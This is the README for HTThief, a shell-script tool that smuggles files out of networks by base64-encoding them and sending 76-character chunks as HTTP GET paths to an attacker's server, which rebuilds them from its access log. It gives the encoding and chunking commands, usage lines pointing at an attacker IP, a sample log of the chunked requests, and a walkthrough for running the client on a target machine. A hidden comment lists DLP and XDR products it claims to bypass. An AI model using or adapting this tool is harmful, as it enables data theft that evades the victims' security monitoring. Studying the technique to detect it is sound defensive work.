# HTThief

HTThief was developed by me and it's not just another tool - it improves a unexplored data exfiltration technique, with the intention of serving as a (simple but effective) way to transfer files protected by DLP, E/XDR and etc (exfiltration) in a stealthy way. Convert any type of file (eg executables, Office, Zip, images) into URLs and send them via simple HTTP GET.


# Author
Vinicius Vieira


# Why is this different from every other HTTP exfiltration technique?

The most common data exfiltration techniques via HTTP are based on POST method (uploding files, encrypted or not). These techniques can be easily detected, either by anomalous behavior of the endpoint (uploading a file on an unknown website, for example) or even by traffic (through DLP, IDS/IPS for example), as well as being easily mitigated.

HTThief differs from the others because it encodes the raw file data in Base64 and divides it into small strings, which are passed using the GET method to the server instead of POST. Each GET calls the attacker's IP/domain plus a chunk of base64 as part of the requested address. Obviously the address does not exist in the destination, however the behavior of the client machine is similar to a user accessing a certain resource on a website rather then uploading a file.

On the server side, HTThief collects logs from received GETs, processes the data and reassembles the file in its original form.

This makes detection and mitigation very difficult, because through this process of steganography of the file in many URLs, it becomes very dificult to detect that each one is actually a piece of a certain file.

# How it works?

How HTThief works is based on two assumptions: 

1) encode the file in base64 to be sent; and
   
    ```
    ### encoding the file
    echo "Enconding the file..."
    ENCODED=$(base64 $path)
    echo $ENCODED > /tmp/ax0c.txt
    ```
    
2) divide it into pieces to make it difficult to decode the file during sending
   
    ```
    ### organizing the file
    echo "Organizating the file..."
    tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
    FILE="/tmp/ax0d.txt"
    ```
By default base64 will generate strings of 76 characters with a nullbyte (which in ASCII is understood as a space) at the end, instead of a new line (see RFC2045 and Base64 manpage). 

![h6](https://github.com/V1n1v131r4/HTThief/assets/1153876/4612fce1-19e5-4d74-90de-cb117e493545)

HTThief takes advantage of this to replace these spaces with new lines by means of ```tr -s``` and send the HTTP GET of each line of the encoded file, that is, pieces of 76 characters. 

```
tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
```

That way, even if there is some soul that decodes during tracing, this piece of code could not be identified as the original file.

```
┌──(kali㉿kali)-[~/HTThief]
└─$ cat /var/log/apache2/access.log
 
127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET //9j/4QCKRXhpZgAATU0AKgAAAAgABQENAAIAAAAnAAAASgEaAAUAAAABAAAAcgEbAAUAAAABAAAA HTTP/1.1" 404 432 "-" "curl/7.88.1"
127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /egEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAA8P3BocCBwaHBpbmZvKCk7IF9faGFsdF9jb21w HTTP/1.1" 404 432 "-" "curl/7.88.1"
127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /aWxlcigpOyA/PgAAAAAASAAAAAEAAABIAAAAAf/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB HTTP/1.1" 404 432 "-" "curl/7.88.1"
127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB HTTP/1.1" 404 432 "-" "curl/7.88.1"
127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/8AAEQgDIAMg HTTP/1.1" 404 432 "-" "curl/7.88.1"
```



# Usage

The use of HTThief is simple:

```
kali@kali:~ ./client.sh --ip <HTThief_Server_IP>
```

If your connection have proxy, use:

```
kali@kali:~ ./client.sh --ip <HTThief_Server_IP> --user <username_proxy> --pass <password_proxy>
```

You can replace the parameter for attacker IP address or attacker domain, wherever.


# Tutorial

HTThief is based on two scripts, one to be executed on the server/attacker machine (who will receive the file) and another on the client (machine that will send the file):

```
┌──(kali㉿kali)-[~/HTThief]
└─$ ls -l
total 8
-rwxr-xr-x 1 kali kali 2681 Aug 10 09:13 client.sh
-rwxr-xr-x 1 kali kali  846 Aug 10 09:11 server.sh

```

After choosing the file to be sent, first you must run ```server.sh``` on the attacking machine:

![h1](https://github.com/V1n1v131r4/HTThief/assets/1153876/48c9c3eb-250b-429d-9b0a-9af753e87709)



On the target machine, run ```client.sh``` and fill in the absolute path of the file that should be sent:

![h2](https://github.com/V1n1v131r4/HTThief/assets/1153876/d708c3de-0553-49c5-9319-fde9c393f906)


After sending the file and **you got the "Done!" response**, go back to the attacking machine, type "yes" for the script flow to end.

**WARNING**: The larger the file, the longer the upload process takes. Be patient and wait until it is fully shipped.

At the end of receiving, choose the original extension of the file so that it is originally reassembled on the attacking machine.


![h3](https://github.com/V1n1v131r4/HTThief/assets/1153876/e3a3f84d-3f13-4908-acf9-26d5766edcb0)

![h4](https://github.com/V1n1v131r4/HTThief/assets/1153876/86d891d5-5aa2-45a0-93d2-781ac72f7277)




# Do you want to use in a Windows environment?

 
Although HTThief is written in Shell Script, it can be easily used by any user who has access to WSL in a Windows environment. Just copy the client.sh to the Linux distribution running on WSL and run it, pointing to the file you want to exfiltrate from the Windows environment.

![WhatsApp Image 2023-08-12 at 12 14 01](https://github.com/V1n1v131r4/HTThief/assets/1153876/934c839c-dc5e-47e0-ae07-c033a3319eb1)




# Requires

On attacker (server) machine you will need the Apache2 installed.


<!--
# Vendor bypassed (nov/23)

| Vendor | Version | OS | 
| ------ | ------- | -- | 
| Netscope Cloud Security | 110.0.0 | OSX 14.1.1 / Windows 22H2 (WSL) |
| Zscaler Zero Trust Exchange | SaaS | OSX 14.1.1 / Windows 22H2 (WSL) |
| FortiGate (FortiOS) | 6.2.15 | Windows 22H2 (WSL) |
| SentinelOne Singularity XDR | 23.3.1.7037 | OSX 14.1.1 |
| Microsoft Purview DLP | SaaS | Windows 22H2 (WSL) | 
-->



# To Do

- replace Apache2 requirenment to Go wbserver.
- Implement multi-host exfiltration support
